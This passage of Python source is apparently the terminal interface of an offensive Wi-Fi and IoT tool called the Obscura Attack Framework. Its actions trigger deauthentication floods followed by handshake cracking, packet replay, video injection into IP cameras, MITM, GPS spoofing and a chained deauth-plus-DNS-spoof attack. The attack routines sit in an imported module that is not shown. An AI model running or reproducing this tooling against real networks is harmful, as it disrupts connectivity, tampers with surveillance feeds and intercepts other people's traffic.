        table = self.query_one("#network_table", DataTable)
        if table.cursor_row > 0:
            table.move_cursor(row=table.cursor_row - 1)

    def action_scan_vulnerabilities(self):
        if not self.selected_camera_mac:
            self.push_screen(GlitchAlert("No Camera Selected"))
            return
        self.notify(f"Scanning vulnerabilities for {self.selected_camera_mac}...")
        threading.Thread(
            target=self.orchestrator.scan_vulnerabilities,
            args=(self.selected_camera_mac, self),
            daemon=True,
        ).start()

    def action_scan_bluetooth(self):
        self.notify("Scanning Bluetooth devices...")
        threading.Thread(
            target=self.orchestrator.scan_bluetooth, args=(self,), daemon=True
        ).start()

    def action_change_theme(self):
        self.push_screen(ThemeScreen(), self.handle_theme_selection)

    def handle_theme_selection(self, result):
        if result:
            action, data = result
            if action == "apply":
                self.apply_theme(data, save=True)
            elif action == "preview":
                self.apply_theme(data, save=False)
            elif action == "save":
                config = load_config()
                custom_themes = config.get("custom_themes", [])
                if data not in custom_themes:
                    custom_themes.append(data)
                    config["custom_themes"] = custom_themes
                    save_config(config)
                    self.notify(f"Saved custom theme: {data['name']}")
                else:
                    self.notify(f"Theme {data['name']} already exists")
        else:
            self.notify("Theme selection canceled")

    def apply_theme(self, theme, save=False):
        if isinstance(theme, dict):
            bg = theme["bg"]
            fg = theme["fg"]
            self.obscura_theme = theme["name"]
        else:
            self.obscura_theme = theme
            themes = {
                "dark": ("#121212", "#00FF00"),
                "light": ("#FFFFFF", "#000000"),
                "high_contrast": ("#000000", "#FFFF00"),
                "solarized_dark": ("#002b36", "#839496"),
                "solarized_light": ("#fdf6e3", "#657b83"),
            }
            bg, fg = themes.get(theme, ("#121212", "#00FF00"))  # Fallback to dark theme
        try:
            self.stylesheet.update(
                f"""
            Screen {{
                background: {bg};
                color: {fg};
            }}
            """
            )
        except Exception as e:
            self.notify(f"[red]Theme application failed: {e}[/]")
        else:
            if save:
                config = load_config()
                config["theme"] = self.obscura_theme
                save_config(config)
            self.notify(f"Applied theme: {self.obscura_theme}")

    def action_detect_threats(self):
        self.notify("Detecting threats...")
        threading.Thread(
            target=self.orchestrator.detect_threats, args=(self,), daemon=True
        ).start()

    def action_replay_packet(self):
        if not self.captured_packets:
            self.push_screen(GlitchAlert("No Packets Captured"))
            return
        pkt = self.captured_packets[-1]["packet"]
        self.push_screen(
            ConfirmDialog("Replay last captured packet?"),
            lambda confirmed: self._replay_packet(confirmed, pkt),
        )

    def _replay_packet(self, confirmed: bool, pkt):
        if not confirmed:
            self.notify("Packet replay canceled")
            return
        try:
            scapy.sendp(pkt, iface=self.orchestrator.interface, count=1, verbose=0)
            self.notify("[green]Packet replayed[/]")
        except Exception as e:
            self.push_screen(GlitchAlert(f"Replay Failed: {e}"))

    def action_plan_attack(self):
        self.notify("Planning attack sequence...")
        threading.Thread(target=self.plan_attack_thread, daemon=True).start()

    def plan_attack_thread(self):
        global network_deauth_active
        with detected_networks_lock:
            if not self.detected_networks:
                self.push_screen(GlitchAlert("No Networks Detected"))
                return
            bssid = max(
                self.detected_networks.items(), key=lambda x: x[1].get("signal", -100)
            )[0]
        network_deauth_active = True
        threading.Thread(
            target=network_deauth_thread,
            args=([bssid], self.orchestrator.interface, self.orchestrator, self),
            daemon=True,
        ).start()
        time.sleep(30)
        for hs in self.handshakes:
            if hs["bssid"] == bssid and not hs["cracked"]:
                self.action_crack_handshake()
                break
        self.notify("[green]Attack sequence completed[/]")

    def action_open_command_line(self):
        self.push_screen(CommandLine())

    def action_show_help(self):
        self.push_screen(HelpScreen())

    def action_show_plugins(self):
        self.show_plugins()

    def action_toggle_debug_mode(self):
        self.show_debug_logs = not self.show_debug_logs
        debug_log = self.query_one("#debug_log", RichLog)
        debug_log.styles.display = "block" if self.show_debug_logs else "none"
        self.notify(f"Debug logs {'shown' if self.show_debug_logs else 'hidden'}")

    def update_camera_stream(self):
        if self.stream_active and self.stream_widget:
            self.stream_widget.update(self.stream_widget.frame)

    def update_advanced_metrics(self):
        metrics = self.query_one("#advanced_metrics", Static)
        text = "Metrics:\n" + "\n".join(
            f"{bssid}: Signal={info.get('signal', 'N/A')}dBm, Channel={info.get('channel', 'N/A')}"
            for bssid, info in self.detected_networks.items()
        )
        metrics.update(text)

    def update_packet_visualization(self):
        viz = self.query_one("#packet_viz", Static)
        total_packets = sum(self.packet_counts.values())
        if total_packets == 0:
            viz.update("[dim]Packet Counts:\n[italic]Waiting for packets...[/][/]")
            return
        max_count = max(self.packet_counts.values())
        bars = "Packet Counts:\n" + "\n".join(
            (
                f"{t:<6}: {'█' * int((c / max_count) * 30)} {c}"
                if max_count > 0
                else f"{t:<6}: 0"
            )
            for t, c in self.packet_counts.items()
        )
        viz.update(bars)

        self.packet_counts_history.append(total_packets)
        if len(self.packet_counts_history) > 30:
            self.packet_counts_history.pop(0)
        values = self.packet_counts_history
        if values:
            max_v = max(values)
            bar = "".join("▁▂▃▄▅▆▇█"[int(8 * v / max_v)] for v in values)
            self.query_one("#packet_sparkline", Static).update(bar)

    def update_gps_map(self):
        if self.last_gps_coords:
            m = folium.Map(location=self.last_gps_coords, zoom_start=15)
            folium.Marker(self.last_gps_coords, popup="Spoofed Location").add_to(m)
            map_file = os.path.join(os.path.dirname(__file__), "gps_map.html")
            m.save(map_file)
            self.query_one("#gps_map", Static).update(
                f"Map at {map_file} (Lat: {self.last_gps_coords[0]}, Lon: {self.last_gps_coords[1]})"
            )
            self.query_one("#gps_map_old", Static).update(
                f"Map at {map_file} (Lat: {self.last_gps_coords[0]}, Lon: {self.last_gps_coords[1]})"
            )

    def update_attack_log(self):
        attack_log = self.query_one("#attack_log", RichLog)
        attack_log.clear()
        for entry in self.orchestrator.attack_log[-10:]:
            attack_log.write(entry)

    def update_mode_indicator(self):
        mode_text = []
        if self.orchestrator.simulate_mode:
            mode_text.append("[yellow]Simulation Mode[/yellow]")
        if self.orchestrator.battery_saver:
            mode_text.append("[green]Battery Saver[/green]")
        self.query_one("#mode_indicator", Static).update(
            " | ".join(mode_text) or "Normal Mode"
        )

    def update_channel_display(self):
        try:
            result = subprocess.run(
                ["iw", "dev", self.orchestrator.interface, "info"],
                capture_output=True,
                text=True,
            )
            channel = [
                line.split()[1]
                for line in result.stdout.splitlines()
                if "channel" in line
            ][0]
            self.query_one("#channel_display", Static).update(
                f"Current Channel: {channel}"
            )
        except Exception:
            self.query_one("#channel_display", Static).update("Channel: Unknown")

    def update_active_attacks(self):
        table = self.query_one("#active_attacks_table", DataTable)
        table.clear()
        for proc in self.orchestrator.active_attacks:
            attack_name = proc.args[0] if proc.args else "Unknown"
            target = "N/A"
            status = "Running" if proc.poll() is None else "Completed"
            table.add_row(attack_name, target, status)

    def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        if event.data_table.id == "camera_table":
            self.selected_camera_mac = (
                event.row_key.value.split()[1] if event.row_key.value else None
            )
            if self.selected_camera_mac:
                self.push_screen(
                    CameraContextMenu(self.selected_camera_mac),
                    self.handle_camera_context_action,
                )
        elif event.data_table.id == "network_table":
            self.selected_network_bssid = (
                event.row_key.value.split()[1] if event.row_key.value else None
            )

    def handle_camera_context_action(self, result: str):
        if result and self.selected_camera_mac:
            actions = {
                "rtp": RTPInputScreen,
                "mjpeg": MJPEGInputScreen,
                "rtsp": RTSPInputScreen,
            }
            if result in actions:
                self.push_screen(
                    actions[result](), lambda res: self.execute_injection(result, res)
                )

    def execute_injection(self, injection_type: str, result):
        if not result:
            return
        if injection_type == "rtp":
            camera_ip, video = result
            if self.orchestrator.start_rtp_injection(camera_ip, video, self):
                self.progress_tasks["RTP Injection"] = (0, 100)
                self.notify("[green]RTP Injection started[/]")
        elif injection_type == "mjpeg":
            if self.orchestrator.start_mjpeg_injection(result, self):
                self.progress_tasks["MJPEG Injection"] = (0, 100)
                self.notify("[green]MJPEG Injection started[/]")
        elif injection_type == "rtsp":
            camera_ip, victim_ip, video = result
            if self.orchestrator.start_rtsp_injection(
                camera_ip, victim_ip, video, self
            )[0]:
                self.progress_tasks["RTSP Injection"] = (0, 100)
                self.notify("[green]RTSP Injection started[/]")

    def add_action_history(self, message, log_type="info"):
        self.action_history.append({"message": message, "type": log_type})
        self.update_logs()

    def add_debug_message(self, message):
        self.debug_logs.append(message)
        self.update_logs()

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "start_mitm":
            self.action_bettercap_mitm()
        elif event.button.id == "gps_spoof":
            self.action_gps_spoofing()
        elif event.button.id == "toggle_debug":
            self.action_toggle_debug_mode()
        elif event.button.id == "preview_injected_stream":
            self.action_preview_injected_stream()
        elif event.button.id == "run_hybrid_chain":
            self.action_run_hybrid_chain()
        elif event.button.id == "list_plugins":
            self.action_show_plugins()

    def action_preview_injected_stream(self):
        stream_url = f"http://localhost:{self.preferred_port}/video_feed"
        self.stream_widget = self.query_one("#stream_widget", StreamWidget)
        self.stream_widget.url = stream_url
        self.stream_widget.start_stream()
        self.query_one("#stream_switcher", ContentSwitcher).current = "stream_widget"
        self.stream_active = True
        self.notify("[green]Injected Stream Preview started[/]")

    def action_run_hybrid_chain(self):
        self.orchestrator.execute(
            "chain_hybrid_deauth_and_dns_spoof",
            "00:11:22:33:44:55",
            "AP_BSSID",
            "192.168.1.10",
            "8.8.8.8",
        )
        self.notify("[green]Hybrid Chain Attack started[/]")

    def on_mouse_down(self, event: MouseDown) -> None:
        if event.button == 2:  # Right click
            mac = self.get_selected_mac()
            self.context_menu_popup(mac)

    def context_menu_popup(self, mac):
        if mac:
            self.push_screen(CameraContextMenu(mac), self.handle_camera_context_action)

    def get_selected_mac(self):
        return self.selected_camera_mac if self.selected_camera_mac else None

    def save_config_settings(self):
        config = load_config()
        config["preferred_port"] = self.preferred_port
        config["last_attack"] = self.last_attack
        save_config(config)

    def on_tabbed_content_tab_changed(self, event) -> None:
        if event.tab == "monitoring":
            self.update_network_table()
            self.update_camera_table()
        elif event.tab == "replay":
            self.update_packet_table()


if __name__ == "__main__":
    import queue
    import argparse
    from obscura.attacks import AttackOrchestrator
    from obscura.utils import log_message

    parser = argparse.ArgumentParser(description="Obscura Attack Framework UI")
    parser.add_argument(
        "--iface", default="wlan0", help="Wireless interface to use (default: wlan0)"
    )
    parser.add_argument(
        "--simulate",
        action="store_true",
        help="Enable simulation mode (no real attacks)",
    )
    args = parser.parse_args()

    detected_networks_queue = queue.Queue()
    detected_cameras_queue = queue.Queue()

    orchestrator = AttackOrchestrator(interface=args.iface, simulate_mode=args.simulate)

    app = ObscuraApp(
        detected_networks_queue=detected_networks_queue,
        detected_cameras_queue=detected_cameras_queue,
        orchestrator=orchestrator,
    )
    app.run()
